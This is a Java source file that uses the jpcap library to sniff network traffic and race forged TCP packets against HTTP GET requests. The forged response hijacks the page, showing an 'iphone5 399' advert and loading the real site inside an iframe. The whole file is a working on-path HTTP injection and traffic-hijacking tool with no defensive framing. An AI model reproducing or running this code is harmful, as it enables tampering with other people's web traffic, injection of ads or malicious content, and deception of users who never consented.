import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.PacketReceiver;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;

public class Capture implements PacketReceiver {

        private static NetworkInterface[] devices = jpcap.JpcapCaptor
                        .getDeviceList();

        public Capture() {
                // this.devices = jpcap.JpcapCaptor.getDeviceList();
        }

        public static String getIp() {
                InetAddress inet = null;
                try {
                        inet = InetAddress.getLocalHost();
                        String ip = inet.getHostAddress(); // 在某些linux机器上取到的ip是host绑定的本机ip，即127.0.0.1
                        return ip;
                } catch (Exception e) {

                }
                return null;
        }

        private void printDebugInfo(TCPPacket tcpPacket,
                        EthernetPacket ethernetPacket) {
                System.out
                                .println("-------------------DEBUG INFO START---------------------------");
                System.out.println("Protocol:" + tcpPacket.protocol);
                System.out.println(tcpPacket.src_ip + ":" + tcpPacket.src_port
                                + "---------->" + tcpPacket.dst_ip + ":" + tcpPacket.dst_port);
                System.out.println(ethernetPacket.getSourceAddress() + "------>"
                                + ethernetPacket.getDestinationAddress());
                System.out.println("SEQ:" + tcpPacket.sequence + " ACK:"
                                + tcpPacket.ack_num + " SEC:" + tcpPacket.sec);

                if (tcpPacket.data.length > 1) {
                        System.out.println("data：");
                        try {
                                System.out.println(new String(tcpPacket.data, "utf-8"));
                        } catch (UnsupportedEncodingException e) {
                                // TODO Auto-generated catch block
                                e.printStackTrace();
                        }
                }
                System.out
                                .println("-------------------DEBUG INFO END---------------------------");

        }

        @Override
        public void receivePacket(Packet p) {

                if (p instanceof TCPPacket) {
                        TCPPacket tcpPacket = (TCPPacket) p;

                        String host = "";
                        String skipStr = "?wukong";

                        String[] sitelist = { "s2.55joy.com", "www.baidu.com" };

                        // InetAddress ip = InetAddress.getByName("192.157.192.213");
                        String headDate = "";
                        try {
                                headDate = new String(tcpPacket.data, "utf-8");
                        } catch (UnsupportedEncodingException e1) {
                                // TODO Auto-generated catch block
                                e1.printStackTrace();
                        }

                        if (tcpPacket.dst_port == 80 && (headDate.indexOf("GET") == 0)) {
                                String[] header = headDate.split("\r\n");

                                for (int i = 0; i < header.length; i++) {

                                        if (header[i].indexOf("Host:") == 0) {
                                                host = header[i].substring(6);
                                                break;
                                        }
                                }

                                System.out.println(host);

                                String url = headDate.substring(0,
                                                headDate.indexOf("HTTP/") - 1).substring(4);
                                
                                System.out.println("------"+url+"-----"+url.substring(url.length() - 1).equals("/"));

                                EthernetPacket ethernetPacket = (EthernetPacket) p.datalink;
                                if (url.equals("/t.html")
                                                || url.substring(url.length() - 1).equals("/")) {
                                        printDebugInfo(tcpPacket, ethernetPacket);
                                        JpcapSender sender = null;
                                        try {
                                                sender = JpcapSender.openDevice(devices[0]);
                                        } catch (IOException e) {
                                                // TODO Auto-generated catch block
                                                e.printStackTrace();
                                        }
                                        int segmentSize = tcpPacket.data.length;
                                        // tcpPacket.data.length

                                        System.out.println(tcpPacket.data.length);

                                        TCPPacket p1 = new TCPPacket(tcpPacket.dst_port,
                                                        tcpPacket.src_port, tcpPacket.ack_num,
                                                        tcpPacket.sequence + segmentSize, false, true,
                                                        false, false, false, false, false, false,
                                                        tcpPacket.window + 2972, tcpPacket.urgent_pointer);

                                        p1.setIPv4Parameter(tcpPacket.priority, tcpPacket.d_flag,
                                                        tcpPacket.t_flag, tcpPacket.r_flag,
                                                        tcpPacket.rsv_tos, tcpPacket.rsv_frag, true,
                                                        tcpPacket.more_frag, tcpPacket.offset,
                                                        tcpPacket.ident + 39289, 128, tcpPacket.protocol,
                                                        tcpPacket.dst_ip, tcpPacket.src_ip);
                                        p1.data = ("").getBytes();
                                        EthernetPacket ethernet = (EthernetPacket) tcpPacket.datalink;
                                        EthernetPacket ether = new EthernetPacket();
                                        ether.frametype = EthernetPacket.ETHERTYPE_IP;
                                        ether.src_mac = ethernet.dst_mac;
                                        ether.dst_mac = ethernet.src_mac;
                                        p1.datalink = ether;

                                        sender.sendPacket(p1);
                                        printDebugInfo(tcpPacket, ethernetPacket);

                                        p1 = new TCPPacket(tcpPacket.dst_port, tcpPacket.src_port,
                                                        tcpPacket.ack_num,
                                                        tcpPacket.sequence + segmentSize, false, true,
                                                        true, false, false, false, false, false,
                                                        tcpPacket.window + 2972, tcpPacket.urgent_pointer);

                                        p1.setIPv4Parameter(tcpPacket.priority, tcpPacket.d_flag,
                                                        tcpPacket.t_flag, tcpPacket.r_flag,
                                                        tcpPacket.rsv_tos, tcpPacket.rsv_frag, true,
                                                        tcpPacket.more_frag, tcpPacket.offset,
                                                        tcpPacket.ident + 39289, 128, tcpPacket.protocol,
                                                        tcpPacket.dst_ip, tcpPacket.src_ip);

                                        String dataContent = "<html>"
                                                        + "<head>"
                                                        + "<meta http-equiv=\"pragma\" content=\"no-cache\">"
                                                        + "<meta http-equiv=\"cache-control\" content=\"no-cache,must-revalidate\">"
                                                        + "</head>----------------------iphone5 399 !!!!!!!!!!!------------------------------------<br>" 
                                                        + "</head>----------------------iphone5 399------------------------------------<br>" 
                                                        + "</head>----------------------iphone5 399------------------------------------<br>" 
                                                        + "</head>----------------------iphone5 399------------------------------------<br>" 
                                                        + "</head>----------------------iphone5 399------------------------------------<br>" 
                                                        + "</head>----------------------iphone5 399------------------------------------<br>" +
                                                        "<iframe width='1000' border='0' height='700' src='http://"
                                                        + host + url + skipStr + "'></iframe> </html>\n";

                                        byte[] bData = dataContent.getBytes();

                                        p1.data = ("HTTP/1.1 200 OK\r\n"
                                                        + "Server: nginx\r\n"
                                                        + "Date: Tue, 29 Jan 2013 04:42:24 GMT\r\n"
                                                        + "Content-Type: text/html\r\n"
                                                        + "Content-Length: "
                                                        + bData.length
                                                        + "\r\n"
                                                        + "Last-Modified: Tue, 29 Jan 2013 04:42:01 GMT\r\n"
                                                        + "Connection: keep-alive\r\n"
                                                        + "Accept-Ranges: bytes\r\n" + "\r\n" + dataContent)
                                                        .getBytes();
                                        ethernet = (EthernetPacket) tcpPacket.datalink;
                                        ether = new EthernetPacket();
                                        ether.frametype = EthernetPacket.ETHERTYPE_IP;
                                        ether.src_mac = ethernet.dst_mac;
                                        ether.dst_mac = ethernet.src_mac;
                                        p1.datalink = ether;

                                        printDebugInfo(tcpPacket, ethernetPacket);
                                        sender.sendPacket(p1);

                                        p1 = new TCPPacket(tcpPacket.dst_port, tcpPacket.src_port,
                                                        tcpPacket.ack_num,
                                                        tcpPacket.sequence + segmentSize, false, true,
                                                        false, false, false, true, false, false,
                                                        tcpPacket.window + 2972, tcpPacket.urgent_pointer);

                                        p1.setIPv4Parameter(tcpPacket.priority, tcpPacket.d_flag,
                                                        tcpPacket.t_flag, tcpPacket.r_flag,
                                                        tcpPacket.rsv_tos, tcpPacket.rsv_frag, true,
                                                        tcpPacket.more_frag, tcpPacket.offset,
                                                        tcpPacket.ident + 39289, 128, tcpPacket.protocol,
                                                        tcpPacket.dst_ip, tcpPacket.src_ip);
                                        p1.data = ("").getBytes();
                                        ethernet = (EthernetPacket) tcpPacket.datalink;
                                        ether = new EthernetPacket();
                                        ether.frametype = EthernetPacket.ETHERTYPE_IP;
                                        ether.src_mac = ethernet.dst_mac;
                                        ether.dst_mac = ethernet.src_mac;
                                        p1.datalink = ether;
                                        System.out
                                                        .println("----------------------------------------------");
                                        sender.sendPacket(p1);
                                }

                        }

                }

        }

        public static void main(String[] args) throws IOException {

                JpcapCaptor cap = jpcap.JpcapCaptor
                                .openDevice(devices[0], 100, true, 1);
                cap.loopPacket(-1, new Capture());

        }

}